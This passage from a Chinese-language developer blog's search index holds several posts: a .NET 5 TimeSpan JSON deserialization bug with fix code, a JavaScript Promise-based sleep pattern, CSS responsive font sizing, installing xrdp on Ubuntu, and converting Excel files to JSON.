","date":"2023-08-27","objectID":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/:2:0","tags":[".netcore","timespan","json"],"title":"Net 5 TimeSpan 做 Json 序列化引發的慘劇","uri":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/"},{"categories":[".Net Core"],"content":"慘劇發生 半夜系統上線，早上收到有很多使用者遇到不能用，原因這次上板我加上SlidingExpiration 而造成下面錯誤。 [18:39:39 ERR] {\"ExceptionMessage\":\"The sliding expiration value must be positive. (Parameter 'SlidingExpiration')\\r\\nActual value was 00:00:00.\",\"Request\":{\"Method\":\"GET\",\"Path\":\"************\",\"Body\":\"\",\"ResponseStatusCode\":200}} System.ArgumentOutOfRangeException: The sliding expiration value must be positive. (Parameter 'SlidingExpiration') Actual value was 00:00:00. at Microsoft.Extensions.Caching.Distributed.DistributedCacheEntryOptions.set_SlidingExpiration(Nullable`1 value) at System.Text.Json.JsonPropertyInfo`1.ReadJsonAndSetMember(Object obj, ReadStack\u0026 state, Utf8JsonReader\u0026 reader) at System.Text.Json.Serialization.Converters.ObjectDefaultConverter`1.OnTryRead(Utf8JsonReader\u0026 reader, Type typeToConvert, JsonSerializerOptions options, ReadStack\u0026 state, T\u0026 value) at System.Text.Json.Serialization.JsonConverter`1.TryRead(Utf8JsonReader\u0026 reader, Type typeToConvert, JsonSerializerOptions options, ReadStack\u0026 state, T\u0026 value) at System.Text.Json.JsonPropertyInfo`1.ReadJsonAndSetMember(Object obj, ReadStack\u0026 state, Utf8JsonReader\u0026 reader) at System.Text.Json.Serialization.Converters.ObjectDefaultConverter`1.OnTryRead(Utf8JsonReader\u0026 reader, Type typeToConvert, JsonSerializerOptions options, ReadStack\u0026 state, T\u0026 value) at System.Text.Json.Serialization.JsonConverter`1.TryRead(Utf8JsonReader\u0026 reader, Type typeToConvert, JsonSerializerOptions options, ReadStack\u0026 state, T\u0026 value) at System.Text.Json.Serialization.JsonConverter`1.ReadCore(Utf8JsonReader\u0026 reader, JsonSerializerOptions options, ReadStack\u0026 state) at System.Text.Json.JsonSerializer.ReadCore[TValue](JsonConverter jsonConverter, Utf8JsonReader\u0026 reader, JsonSerializerOptions options, ReadStack\u0026 state) at System.Text.Json.JsonSerializer.ReadCore[TValue](Utf8JsonReader\u0026 reader, Type returnType, JsonSerializerOptions options) at System.Text.Json.JsonSerializer.Deserialize[TValue](String json, Type returnType, JsonSerializerOptions options) at System.Text.Json.JsonSerializer.Deserialize[TValue](String json, JsonSerializerOptions options) at ...................CacheManager.GetDataAsync[T](String id, String dataGroup, MemoryCacheEntryOptions memoryOptions) in .........\\CacheManager.cs:line 37 at ..................... 好了，花了很多時間找到問題，這邊整理一下。文章都已經破題了，沒錯！就是 TimeSpan Json 序列化造成的。其實當初我看到重點在 SMicrosoft.Extensions.Caching.Distributed.DistributedCacheEntryOptions.set_SlidingExpiration(Nullable1 value)所造成錯誤，這邊也翻了這個地方源碼。找到錯誤的地方，奇怪，我明明有設定 SlidingExpiration 五分鐘，怎麼這邊顯示 00:00:00? ","date":"2023-08-27","objectID":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/:3:0","tags":[".netcore","timespan","json"],"title":"Net 5 TimeSpan 做 Json 序列化引發的慘劇","uri":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/"},{"categories":[".Net Core"],"content":"分析問題 其實這個實例反序列化就錯了，其實從 log 中可以看出System.Text.Json.JsonPropertyInfo1.ReadJsonAndSetMember反序列化遇到這個錯誤問題。 Info 這邊以為是微軟內部 Cache抓不到資訊所造成的，結果查錯方向浪費一堆時間。 那到底為什麼會錯呢? ","date":"2023-08-27","objectID":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/:4:0","tags":[".netcore","timespan","json"],"title":"Net 5 TimeSpan 做 Json 序列化引發的慘劇","uri":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/"},{"categories":[".Net Core"],"content":".Net 5 和 .Net 6 TimeSpan 序列化不一樣結果 我程式是用我從資料表抓出 Cache 資料是 {\"Value\":.......,\"Options\":{\"AbsoluteExpiration\":\"2023-07-14T19:37:08.48+08:00\",\"AbsoluteExpirationRelativeToNow\":null,\"SlidingExpiration\":{\"Ticks\":3000000000,\"Days\":0,\"Hours\":0,\"Milliseconds\":0,\"Minutes\":5,\"Seconds\":0,\"TotalDays\":0.003472222222222222,\"TotalHours\":0.08333333333333333,\"TotalMilliseconds\":300000,\"TotalMinutes\":5,\"TotalSeconds\":300}}} 不過我從 LinqPad 7使用是.Net6，這邊產生結果不一樣。 這也是這次不能寫入原因，原因是 .Net 6 會針對 TimeSpan 做格式轉換，.Net 5之前都不會做。可以看相關文章: System.Text.Json 反序列化/序列化轉換 TimeSpan 型別 Breaking change: Default serialization format for TimeSpan - .NET | Microsoft Learn ","date":"2023-08-27","objectID":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/:4:1","tags":[".netcore","timespan","json"],"title":"Net 5 TimeSpan 做 Json 序列化引發的慘劇","uri":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/"},{"categories":[".Net Core"],"content":"TimeSpan 屬性唯讀 其實上面 .Net 5 和 .Net 6 TimeSpan 序列化不一樣結果 也不是主要原因，其實 TimeSpan 是 struct，主要反序列化也會寫回屬性才對。然後我去看 TimeSpan 文件看到主要原因，原來屬性沒有 set 方法。 ","date":"2023-08-27","objectID":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/:4:2","tags":[".netcore","timespan","json"],"title":"Net 5 TimeSpan 做 Json 序列化引發的慘劇","uri":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/"},{"categories":[".Net Core"],"content":"測試圖片 .Net 6 做序列化和反序列化正常。 .Net 5 做序列化和反序列化沒成功還原，原因屬性沒有set方法。 .Net 5 就算空的，他也會回來空的 TimeSpan。這也是為什麼屬性沒塞到也不會錯。 ","date":"2023-08-27","objectID":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/:4:3","tags":[".netcore","timespan","json"],"title":"Net 5 TimeSpan 做 Json 序列化引發的慘劇","uri":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/"},{"categories":[".Net Core"],"content":"解決方法 ","date":"2023-08-27","objectID":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/:5:0","tags":[".netcore","timespan","json"],"title":"Net 5 TimeSpan 做 Json 序列化引發的慘劇","uri":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/"},{"categories":[".Net Core"],"content":"實作 System.Text.Json Converter .Net 5 自己要寫個 TimeSpan Json Converter 方法。可參考: System.Text.Json 反序列化/序列化轉換 TimeSpan 型別 using System.Globalization; namespace System.Text.Json.Serialization { /// \u003csummary\u003e /// \u003csee cref=\"JsonConverter\"/\u003e to convert TimeSpan to and from strings. /// \u003c/summary\u003e public class JsonTimeSpanConverter : JsonConverter\u003cTimeSpan\u003e { public override TimeSpan Read(ref Utf8JsonReader reader, Type typeToConvert, JsonSerializerOptions options) { if (reader.TokenType != JsonTokenType.String) throw new NotSupportedException(); if (typeToConvert != typeof(TimeSpan)) throw new NotSupportedException(); // 使用常量 \"c\" 來指定用 [-][d.]hh:mm:ss[.fffffff] 作為 TimeSpans 轉換的格式 return TimeSpan.ParseExact(reader.GetString(), \"c\", CultureInfo.InvariantCulture); } public override void Write(Utf8JsonWriter writer, TimeSpan value, JsonSerializerOptions options) { writer.WriteStringValue(value.ToString(\"c\", CultureInfo.InvariantCulture)); } } } 最後在 TimeSpan 加上[JsonConverter(typeof(JsonTimeSpanConverter))] 屬性就完事。 我把程式執行放在 LinqPad: http://share.linqpad.net/mx45h3.linq ","date":"2023-08-27","objectID":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/:5:1","tags":[".netcore","timespan","json"],"title":"Net 5 TimeSpan 做 Json 序列化引發的慘劇","uri":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/"},{"categories":[".Net Core"],"content":"使用 Json.Net JSON.Net 內建有 TimeSpan Converter，所以我當初用這個的話，我說不定就不會翻車🤔 不過 JsonConvert 序列化/反序列化要轉成 bytes 給 Cache 存。這邊順便留著。 public class CacheManager { private readonly IMemoryCache _memoryCache; private readonly IDistributedCache _distributedCache; public CacheManager(IMemoryCache memoryCache, IDistributedCache distributedCache) { _memoryCache = memoryCache; _distributedCache = distributedCache; } public async Task\u003cT\u003e GetDataAsync\u003cT\u003e(string id, string dataGroup = \"MyData\", MemoryCacheEntryOptions memoryOptions = null) { string cacheKey = $\"{dataGroup}_{id}\"; if (!_memoryCache.TryGetValue(cacheKey, out T data)) { // 緩存未命中，從 IDistributedCache 獲取資料 byte[] cacheValue = await _distributedCache.GetAsync(cacheKey); if (cacheValue != null) { using var memoryStream = new MemoryStream(cacheValue); using var streamReader = new StreamReader(memoryStream); var stream = await streamReader.ReadToEndAsync(); // 將字節數組轉換為泛型類型 T CachedItem\u003cT\u003e wrapData = JsonConvert.DeserializeObject\u003cCachedItem\u003cT\u003e\u003e(stream); data = wrapData.Value; // 將資料寫入 IMemoryCache memoryOptions ??= new MemoryCacheEntryOptions { SlidingExpiration = wrapData.Options.SlidingExpiration, AbsoluteExpirationRelativeToNow = wrapData.Options.AbsoluteExpirationRelativeToNow, AbsoluteExpiration = wrapData.Options.AbsoluteExpiration, }; _memoryCache.Set(cacheKey, data, memoryOptions); } else { // 資料不存在，執行其他邏輯 } } return data; } public async Task UpdateDataAsync\u003cT\u003e(string id, T data, string dataGroup = \"MyData\", MemoryCacheEntryOptions memoryOptions = null ,DistributedCacheEntryOptions distributedCacheOptions = null) { string cacheKey = $\"{dataGroup}_{id}\"; // 將泛型類型 T 轉換為字節數組 byte[] cacheValue = System.Text.Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(new CachedItem\u003cT\u003e {Options = distributedCacheOptions, Value = data} )); // 將資料寫入 IDistributedCache distributedCacheOptions ??= new DistributedCacheEntryOptions { SlidingExpiration = TimeSpan.FromMinutes(10), AbsoluteExpirationRelativeToNow = TimeSpan.FromHours(1), }; await _distributedCache.SetAsync(cacheKey, cacheValue, distributedCacheOptions); // 將資料寫入 IMemoryCache memoryOptions ??= new MemoryCacheEntryOptions { SlidingExpiration = TimeSpan.FromMinutes(5), AbsoluteExpirationRelativeToNow = TimeSpan.FromMinutes(10), }; _memoryCache.Set(cacheKey, data, memoryOptions); } public async Task DeleteDataAsync(string id, string dataGroup = \"MyData\") { string cacheKey = $\"{dataGroup}_{id}\"; _memoryCache.Remove(cacheKey); await _distributedCache.RemoveAsync(cacheKey); } } public class CachedItem\u003cT\u003e { public T Value { get; set; } public DistributedCacheEntryOptions Options { get; set; } } ","date":"2023-08-27","objectID":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/:5:2","tags":[".netcore","timespan","json"],"title":"Net 5 TimeSpan 做 Json 序列化引發的慘劇","uri":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/"},{"categories":[".Net Core"],"content":"彩蛋 因為 TimeSpan 是 Struct，這邊順便查查跟 Class 哪裡不一樣。 Struct V.S Class 兩者之間差異 | 石頭的coding之路 - 點部落 C# struct 使用注意事項 – Opass Life ","date":"2023-08-27","objectID":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/:6:0","tags":[".netcore","timespan","json"],"title":"Net 5 TimeSpan 做 Json 序列化引發的慘劇","uri":"/blog/posts/Net-5-TimeSpan-%E5%81%9A-Json-%E5%BA%8F%E5%88%97%E5%8C%96%E5%BC%95%E7%99%BC%E7%9A%84%E6%85%98%E5%8A%87/"},{"categories":["JavaScript"],"content":"最近有一個情境，同一頁使用者會有持續呼叫API方法，但需要控制按鈕等前一個API呼叫，減少併發發生狀況，這邊就找了方法排除，有找到使用 sleep 方法去解決這個問題。 ","date":"2023-08-27","objectID":"/blog/posts/JavaScript-Sleep-SetTimeout-%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%99%95%E7%90%86%E6%96%B9%E6%B3%95/:0:0","tags":["javascript","sleep","settimeout","async"],"title":"JavaScript Sleep SetTimeout 非同步處理方法","uri":"/blog/posts/JavaScript-Sleep-SetTimeout-%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%99%95%E7%90%86%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"重點絲路 因為重點很少，就不寫心智圖。 利用 Promise 裡面包住 setTimeout 方法去做呼叫，這邊外面可以用 Promise 去做非同步處理，可以用 await搭配使用，這樣就可以等待時間到才開始執行下面程式。要等多的非同步可以用Promise.all 方法去搭配 await 去判斷。 ","date":"2023-08-27","objectID":"/blog/posts/JavaScript-Sleep-SetTimeout-%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%99%95%E7%90%86%E6%96%B9%E6%B3%95/:1:0","tags":["javascript","sleep","settimeout","async"],"title":"JavaScript Sleep SetTimeout 非同步處理方法","uri":"/blog/posts/JavaScript-Sleep-SetTimeout-%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%99%95%E7%90%86%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"sleep 非同步 透過 Promise 可以做到非同步處理。 function timeout(ms) { return new Promise(resolve =\u003e setTimeout(resolve, ms)); } async function sleep(fn, ...args) { return fn(...args); } sleep(()=\u003ealert('test')); ","date":"2023-08-27","objectID":"/blog/posts/JavaScript-Sleep-SetTimeout-%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%99%95%E7%90%86%E6%96%B9%E6%B3%95/:2:0","tags":["javascript","sleep","settimeout","async"],"title":"JavaScript Sleep SetTimeout 非同步處理方法","uri":"/blog/posts/JavaScript-Sleep-SetTimeout-%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%99%95%E7%90%86%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"模擬防止併發 AJAX 情境 透過 Promise 特性，使用全域變數抓 Promise 變數，前面加上 await 就能阻擋這個情境。執行 Run Ajax Note: timeout 方法這邊模擬當作抓資料時間，實際可以用 axios 做替換。 \u003cscript\u003e var a; function timeout(ms) { return new Promise(resolve =\u003e setTimeout(resolve, ms)); } async function sleep(fn, ...args) { await a; return fn(...args); } \u003c/script\u003e \u003cbutton onclick=\"a=timeout(3000);\"\u003eRun AJAX\u003c/button\u003e \u003cbutton onclick=\"this.onclick=null;sleep(()=\u003e{alert('test');location.href='.';});\"\u003eAfter AJAX ,it is alert \u003c/button\u003e Info 這邊使用情境是用一個 Promise ，這邊假如有多隻API要等的話可以用Promise.all，這邊以前不知道這個情境可以用在哪裡，經過這個情境大概知道要怎麼用。 ","date":"2023-08-27","objectID":"/blog/posts/JavaScript-Sleep-SetTimeout-%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%99%95%E7%90%86%E6%96%B9%E6%B3%95/:3:0","tags":["javascript","sleep","settimeout","async"],"title":"JavaScript Sleep SetTimeout 非同步處理方法","uri":"/blog/posts/JavaScript-Sleep-SetTimeout-%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%99%95%E7%90%86%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"參考資料 javascript - Combination of async function + await + setTimeout - Stack Overflow What is the JavaScript version of sleep()? - Stack Overflow ","date":"2023-08-27","objectID":"/blog/posts/JavaScript-Sleep-SetTimeout-%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%99%95%E7%90%86%E6%96%B9%E6%B3%95/:4:0","tags":["javascript","sleep","settimeout","async"],"title":"JavaScript Sleep SetTimeout 非同步處理方法","uri":"/blog/posts/JavaScript-Sleep-SetTimeout-%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%99%95%E7%90%86%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"彩蛋 javascript - How to make onclick event to work only once - Stack Overflow ","date":"2023-08-27","objectID":"/blog/posts/JavaScript-Sleep-SetTimeout-%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%99%95%E7%90%86%E6%96%B9%E6%B3%95/:5:0","tags":["javascript","sleep","settimeout","async"],"title":"JavaScript Sleep SetTimeout 非同步處理方法","uri":"/blog/posts/JavaScript-Sleep-SetTimeout-%E9%9D%9E%E5%90%8C%E6%AD%A5%E8%99%95%E7%90%86%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"很久沒寫前端相關文章，最近看到文字可以用 vw 控制放大縮小，這邊也有興趣了解，這邊簡單做個測試順便筆記。 ","date":"2023-08-15","objectID":"/blog/posts/%E7%B6%B2%E9%A0%81%E9%9F%BF%E6%87%89%E5%BC%8F%E6%8E%A7%E5%88%B6%E6%96%87%E5%AD%97%E6%94%BE%E5%A4%A7%E6%89%80%E5%B0%8F%E6%96%B9%E6%B3%95/:0:0","tags":["css","javascript","font"],"title":"網頁響應式控制文字放大所小方法","uri":"/blog/posts/%E7%B6%B2%E9%A0%81%E9%9F%BF%E6%87%89%E5%BC%8F%E6%8E%A7%E5%88%B6%E6%96%87%E5%AD%97%E6%94%BE%E5%A4%A7%E6%89%80%E5%B0%8F%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"傳統 JS 方法控制大小 以前我找到用 JS 依照文字大小控制，這邊有找到這個範例。 Set Font Size Based On Word Count | CSS-Tricks - CSS-Tricks $(function() { var $quote = $(\".post p:first\"); var $numWords = $quote.text().split(\" \").length; if (($numWords \u003e= 1) \u0026\u0026 ($numWords \u003c 10)) { $quote.css(\"font-size\", \"36px\"); } else if (($numWords \u003e= 10) \u0026\u0026 ($numWords \u003c 20)) { $quote.css(\"font-size\", \"32px\"); } else if (($numWords \u003e= 20) \u0026\u0026 ($numWords \u003c 30)) { $quote.css(\"font-size\", \"28px\"); } else if (($numWords \u003e= 30) \u0026\u0026 ($numWords \u003c 40)) { $quote.css(\"font-size\", \"24px\"); } else { $quote.css(\"font-size\", \"20px\"); } }); ","date":"2023-08-15","objectID":"/blog/posts/%E7%B6%B2%E9%A0%81%E9%9F%BF%E6%87%89%E5%BC%8F%E6%8E%A7%E5%88%B6%E6%96%87%E5%AD%97%E6%94%BE%E5%A4%A7%E6%89%80%E5%B0%8F%E6%96%B9%E6%B3%95/:1:0","tags":["css","javascript","font"],"title":"網頁響應式控制文字放大所小方法","uri":"/blog/posts/%E7%B6%B2%E9%A0%81%E9%9F%BF%E6%87%89%E5%BC%8F%E6%8E%A7%E5%88%B6%E6%96%87%E5%AD%97%E6%94%BE%E5%A4%A7%E6%89%80%E5%B0%8F%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"文字響應式控制大小 以下內容擷取用CSS的 min() max() 與vw，設計有極限值的RWD響應式文字內容，建議看裡面教學。 vw 是視窗寬度的百分比，所以 1vw = 1%的視窗寬度。舉例來說，當視窗寬度為 1000px 且 font-size: 1.5vw 的時候，字體的大小就是 1000*1.5% = 15px。 使用可用min,max搭配vw使用。太久沒寫 CSS 都忘記還能這樣做。 h1,.h1{ font-size: 24px; /* for IE */ font-size: min(max(3.5vw, 16px), 40px); } 而第二個 font-size 的意思是字體大小 3.5vw、最小值 16px、最大值 40px。是不是比使用 media query 解決還乾淨多了？ 但你嘗試會發現這邊無法針對文字去做放大縮小設定。實際上目前 CSS 無法做到文字長度判斷，所以只能還是由 JavaScript 控制，但是你沒有依照文字長度大小調整的話，可以用用看這個方法。 ","date":"2023-08-15","objectID":"/blog/posts/%E7%B6%B2%E9%A0%81%E9%9F%BF%E6%87%89%E5%BC%8F%E6%8E%A7%E5%88%B6%E6%96%87%E5%AD%97%E6%94%BE%E5%A4%A7%E6%89%80%E5%B0%8F%E6%96%B9%E6%B3%95/:2:0","tags":["css","javascript","font"],"title":"網頁響應式控制文字放大所小方法","uri":"/blog/posts/%E7%B6%B2%E9%A0%81%E9%9F%BF%E6%87%89%E5%BC%8F%E6%8E%A7%E5%88%B6%E6%96%87%E5%AD%97%E6%94%BE%E5%A4%A7%E6%89%80%E5%B0%8F%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"實作文字大小調整 之前我做的我的動畫清單有些新番名稱太長了，但我那時候沒調整，最近突然想到就稍微調整一下。 調整後 GIT: 標題字型調整 · malagege/vue-myanimelist@dd66143 ","date":"2023-08-15","objectID":"/blog/posts/%E7%B6%B2%E9%A0%81%E9%9F%BF%E6%87%89%E5%BC%8F%E6%8E%A7%E5%88%B6%E6%96%87%E5%AD%97%E6%94%BE%E5%A4%A7%E6%89%80%E5%B0%8F%E6%96%B9%E6%B3%95/:3:0","tags":["css","javascript","font"],"title":"網頁響應式控制文字放大所小方法","uri":"/blog/posts/%E7%B6%B2%E9%A0%81%E9%9F%BF%E6%87%89%E5%BC%8F%E6%8E%A7%E5%88%B6%E6%96%87%E5%AD%97%E6%94%BE%E5%A4%A7%E6%89%80%E5%B0%8F%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"算出中文調整 中文跟英文單字長度不一樣，這邊我們把中文算2字元，簡單算出縮小文字長度。 參考:String Length 中文字串長度 function stringBytes(c){ var n=c.length,s; var len=0; for(var i=0; i \u003cn;i++){ s=c.charCodeAt(i); while( s \u003e 0 ){ len++; s = s \u003e\u003e 8; } } return len; } 其他方法可看利用Byte單位來計算字串長度的幾種做法(Javascript,C#,VB.Net) | F6 Team - 點部落 ","date":"2023-08-15","objectID":"/blog/posts/%E7%B6%B2%E9%A0%81%E9%9F%BF%E6%87%89%E5%BC%8F%E6%8E%A7%E5%88%B6%E6%96%87%E5%AD%97%E6%94%BE%E5%A4%A7%E6%89%80%E5%B0%8F%E6%96%B9%E6%B3%95/:3:1","tags":["css","javascript","font"],"title":"網頁響應式控制文字放大所小方法","uri":"/blog/posts/%E7%B6%B2%E9%A0%81%E9%9F%BF%E6%87%89%E5%BC%8F%E6%8E%A7%E5%88%B6%E6%96%87%E5%AD%97%E6%94%BE%E5%A4%A7%E6%89%80%E5%B0%8F%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"彩蛋 如何使用 Flexbox 完美實現文字的中心對齊 之前 Flex 和 Grid 細節設定都忘光光了，哈哈。但看文件還是可以改。 ","date":"2023-08-15","objectID":"/blog/posts/%E7%B6%B2%E9%A0%81%E9%9F%BF%E6%87%89%E5%BC%8F%E6%8E%A7%E5%88%B6%E6%96%87%E5%AD%97%E6%94%BE%E5%A4%A7%E6%89%80%E5%B0%8F%E6%96%B9%E6%B3%95/:4:0","tags":["css","javascript","font"],"title":"網頁響應式控制文字放大所小方法","uri":"/blog/posts/%E7%B6%B2%E9%A0%81%E9%9F%BF%E6%87%89%E5%BC%8F%E6%8E%A7%E5%88%B6%E6%96%87%E5%AD%97%E6%94%BE%E5%A4%A7%E6%89%80%E5%B0%8F%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"以前在玩樹梅派有做過遠端是使用 TightVNC，之前使用 Xrdp 就沒有深入研究是什麼原因不能用。最近想在 Windows GUI 操作 VM GUI 介面，使用 Xrdp 在我 Windows 安裝才是最方便的，這邊就研究怎麼使用。 這邊我使用 Xrdp 有看到畫面，打上帳號密碼都會進去閃退，這邊就是解決這個問題。 Warning 其實後來我沒有使用這個方法，我使用內建 Ubuntu 內建 VNC 操作遠端。可參考: Ubuntu 20.04 內建遠端方法 - 程式狂想筆記 ","date":"2023-08-13","objectID":"/blog/posts/Windows-%E4%BD%BF%E7%94%A8-Xrdp-%E9%81%A0%E7%AB%AF-Ubuntu-%E6%95%99%E5%AD%B8%E5%92%8C%E4%B8%8D%E9%96%83%E9%80%80%E6%96%B9%E6%B3%95/:0:0","tags":["windows","linux","ubuntu","xrdp","遠端","remote"],"title":"Windows 使用 Xrdp 遠端 Ubuntu 教學和不閃退方法","uri":"/blog/posts/Windows-%E4%BD%BF%E7%94%A8-Xrdp-%E9%81%A0%E7%AB%AF-Ubuntu-%E6%95%99%E5%AD%B8%E5%92%8C%E4%B8%8D%E9%96%83%E9%80%80%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"安裝 sudo apt update sudo apt install xrdp xrdp方式windows 10连接ubuntu 18.04 - 知乎 重開機，不要登入就可以用了。 ","date":"2023-08-13","objectID":"/blog/posts/Windows-%E4%BD%BF%E7%94%A8-Xrdp-%E9%81%A0%E7%AB%AF-Ubuntu-%E6%95%99%E5%AD%B8%E5%92%8C%E4%B8%8D%E9%96%83%E9%80%80%E6%96%B9%E6%B3%95/:1:0","tags":["windows","linux","ubuntu","xrdp","遠端","remote"],"title":"Windows 使用 Xrdp 遠端 Ubuntu 教學和不閃退方法","uri":"/blog/posts/Windows-%E4%BD%BF%E7%94%A8-Xrdp-%E9%81%A0%E7%AB%AF-Ubuntu-%E6%95%99%E5%AD%B8%E5%92%8C%E4%B8%8D%E9%96%83%E9%80%80%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"彩蛋 Ubuntu 安裝可讓 Windows 遠端桌面登入的 xrdp [Jonathan’s Wiki 筆記] Windows 远程桌面连接ubuntu及xrdp的一些小问题（远程桌面闪退、连接失败、tab补全功能，无菜单栏，error - problem connecting ） - hopeless-dream - 博客园 如何使用 XRDP 遠端連線至 Ubuntu16.04 Unity 桌面 - HackMD ","date":"2023-08-13","objectID":"/blog/posts/Windows-%E4%BD%BF%E7%94%A8-Xrdp-%E9%81%A0%E7%AB%AF-Ubuntu-%E6%95%99%E5%AD%B8%E5%92%8C%E4%B8%8D%E9%96%83%E9%80%80%E6%96%B9%E6%B3%95/:2:0","tags":["windows","linux","ubuntu","xrdp","遠端","remote"],"title":"Windows 使用 Xrdp 遠端 Ubuntu 教學和不閃退方法","uri":"/blog/posts/Windows-%E4%BD%BF%E7%94%A8-Xrdp-%E9%81%A0%E7%AB%AF-Ubuntu-%E6%95%99%E5%AD%B8%E5%92%8C%E4%B8%8D%E9%96%83%E9%80%80%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"最近使用者匯入資料，竟然跟之前格式不一樣，但是使用者也不太想改。🤦‍♀️我也只能自己匯入，但用 class 宣告物件真的太麻煩，哪天又改我又要調整，這邊找了很多匯入方案，但都沒有採用，因為單純匯入資料原程式有做額外加工，還有時間不是很充裕，後來想到用暴力把Excel 轉成 JSON，然後用json產生 class 方法，這樣就可以快速匯入程式裡面，又很方便做邏輯檢查。 ","date":"2023-06-22","objectID":"/blog/posts/Excel-%E8%BD%89%E6%88%90-JSON-%E6%96%B9%E6%B3%95/:0:0","tags":["excel","json","tool"],"title":"Excel 轉成 JSON 方法","uri":"/blog/posts/Excel-%E8%BD%89%E6%88%90-JSON-%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Excel 轉 JSON 方法 網路上有很多 Excel 轉 JSON 線上工具，但我想找個 command line 轉換，沒想到沒有很多，這邊使用。rsdoiel/xlsx2json: PROOF OF CONCEPT: A simplistic Excel to JSON converter Danger 我寫完才看到 Repository 寫這句話… this repository has been depreciated and merged with https://github.com/caltechlibrary/datatools 不過是可以跑的，可以換換上面這個。 以前安裝go get 就能安裝，現在都不行了。後來看到 Github 上面有 Release，抓下來解壓縮就能用了。 # Excel 輸出 json xlsx2json test44.xlsx # Excel 轉成 Json xlsx2json test44.xlsx \u003e test.json 雖然產生 JSON 順序沒有一樣，不過可以正常執行，中文也是正常的。 ","date":"2023-06-22","objectID":"/blog/posts/Excel-%E8%BD%89%E6%88%90-JSON-%E6%96%B9%E6%B3%95/:1:0","tags":["excel","json","tool"],"title":"Excel 轉成 JSON 